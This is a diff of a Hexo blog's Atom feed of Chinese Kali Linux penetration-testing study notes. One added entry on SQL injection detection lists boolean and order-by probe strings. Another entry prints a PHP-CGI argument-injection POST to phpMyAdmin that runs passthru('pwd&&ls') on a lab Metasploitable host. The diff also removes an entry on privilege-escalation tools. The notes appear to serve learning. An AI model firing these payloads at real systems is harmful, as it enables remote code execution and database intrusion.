@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-10-15T11:10:16.567Z</updated>
+  <updated>2020-10-17T08:54:56.356Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,41 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>手动漏洞挖掘-SQL注入、一</title>
+    <link href="http://yoursite.com/2020/10/17/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%B8%80/"/>
+    <id>http://yoursite.com/2020/10/17/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-SQL%E6%B3%A8%E5%85%A5%E3%80%81%E4%B8%80/</id>
+    <published>2020-10-17T08:54:31.000Z</published>
+    <updated>2020-10-17T08:54:56.356Z</updated>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;手动漏洞挖掘-SQL注入（一）&quot;&gt;&lt;a href=&quot;#手动漏洞挖掘-SQL注入（一）&quot; class=&quot;headerlink&quot; title=&quot;手动漏洞挖掘-SQL注入（一）&quot;&gt;&lt;/a&gt;手动漏洞挖掘-SQL注入（一）&lt;/h3&gt;&lt;h4 id=&quot;检测&quot;&gt;&lt;a href=&quot;#检测&quot; class=&quot;headerlink&quot; title=&quot;检测&quot;&gt;&lt;/a&gt;检测&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;基于报错的检测方法&lt;/li&gt;
+&lt;li&gt;’    ”    %    （）&lt;/li&gt;
+&lt;li&gt;基于布尔的检测&lt;ul&gt;
+&lt;li&gt;1‘ and ‘1’=’1    /    1’ and ‘1&lt;/li&gt;
+&lt;li&gt;1’ and ‘1’=2    /    1’ and ‘0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;查询的信息有几列&lt;ul&gt;
+&lt;li&gt;‘order by 9 – 知道列数后就可以联合查询&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+    
+      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>手动漏洞挖掘-命令执行、目录遍历、文件包含、文件上传</title>
@@ -56,20 +91,20 @@
   
   <entry>
     <title>手动漏洞挖掘-1.默认安装</title>
-    <link href="http://yoursite.com/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/"/>
-    <id>http://yoursite.com/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/</id>
+    <link href="http://yoursite.com/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/"/>
+    <id>http://yoursite.com/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/</id>
     <published>2020-10-14T09:30:17.000Z</published>
-    <updated>2020-10-14T10:37:55.875Z</updated>
+    <updated>2020-10-15T11:11:57.013Z</updated>
     
     <summary type="html">
     
-      &lt;h3 id=&quot;手动漏洞挖掘-1-默认安装&quot;&gt;&lt;a href=&quot;#手动漏洞挖掘-1-默认安装&quot; class=&quot;headerlink&quot; title=&quot;手动漏洞挖掘-1.默认安装&quot;&gt;&lt;/a&gt;手动漏洞挖掘-1.默认安装&lt;/h3&gt;&lt;ul&gt;
+      &lt;h3 id=&quot;手动漏洞挖掘-默认安装&quot;&gt;&lt;a href=&quot;#手动漏洞挖掘-默认安装&quot; class=&quot;headerlink&quot; title=&quot;手动漏洞挖掘-默认安装&quot;&gt;&lt;/a&gt;手动漏洞挖掘-默认安装&lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;p&gt;Windows默认安装漏洞&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;&lt;p&gt;phpMyAdmin/setup&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;MetaSploitable&lt;figure class=&quot;hljs highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs plain&quot;&gt;POST http:&amp;#x2F;&amp;#x2F;&amp;#x2F;phpMyAdmin&amp;#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&amp;#x2F;&amp;#x2F;input HTTP&amp;#x2F;1.1&lt;br&gt;Host: 192.168.20.10&lt;br&gt;Content-Length: 40&lt;br&gt;&lt;br&gt;&amp;lt;?php&lt;br&gt;passthru(&amp;#39;pwd&amp;amp;&amp;amp;ls&amp;#39;); &lt;br&gt;die();&lt;br&gt;?&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img src=&quot;/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/pic1.png&quot; alt&gt;&lt;/li&gt;
+&lt;img src=&quot;/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/pic1.png&quot; alt&gt;&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;&lt;/ul&gt;
     
     </summary>
@@ -668,39 +703,6 @@
       &lt;h2 id=&quot;Windows身份认证过程&quot;&gt;&lt;a href=&quot;#Windows身份认证过程&quot; class=&quot;headerlink&quot; title=&quot;Windows身份认证过程&quot;&gt;&lt;/a&gt;Windows身份认证过程&lt;/h2&gt;&lt;ul&gt;
 &lt;li&gt;开机加载操作系统内核，windows启动之后，进入ntlogon.exe，即输入用户名和密码的界面。&lt;/li&gt;
 &lt;li&gt;当点击确定后，ntlogon.exe调用lsass.exe（Local Security Assistant）的LsaLogonUser API,该API 调用MSV_1_0身份验证程序包，MSV 身份验证包将用户记录存储在 SAM 数据库（C:\Windows\System32\config）中。&lt;/li&gt;&lt;/ul&gt;
-    
-    </summary>
-    
-    
-      <category term="信息安全" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="渗透测试" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-      <category term="KaliLinux渗透测试学习笔记" scheme="http://yoursite.com/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>提权-本地提权及几个工具(PwDump、WCE、mimikatz)</title>
-    <link href="http://yoursite.com/2020/09/21/%E6%8F%90%E6%9D%83-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B7%A5%E5%85%B7(PwDump%E3%80%81WCE%E3%80%81mimikatz)/"/>
-    <id>http://yoursite.com/2020/09/21/%E6%8F%90%E6%9D%83-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%8F%8A%E5%87%A0%E4%B8%AA%E5%B7%A5%E5%85%B7(PwDump%E3%80%81WCE%E3%80%81mimikatz)/</id>
-    <published>2020-09-21T02:41:03.000Z</published>
-    <updated>2020-09-22T12:59:26.366Z</updated>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;提权&quot;&gt;&lt;a href=&quot;#提权&quot; class=&quot;headerlink&quot; title=&quot;提权&quot;&gt;&lt;/a&gt;提权&lt;/h2&gt;&lt;h3 id=&quot;本地提权&quot;&gt;&lt;a href=&quot;#本地提权&quot; class=&quot;headerlink&quot; title=&quot;本地提权&quot;&gt;&lt;/a&gt;本地提权&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;已实现本地低权限账号登陆&lt;ul&gt;
-&lt;li&gt;远程溢出&lt;/li&gt;
-&lt;li&gt;直接获得账号密码&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;希望获得更高权限&lt;ul&gt;
-&lt;li&gt;实现对目标进一步控制&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
     
     </summary>
     
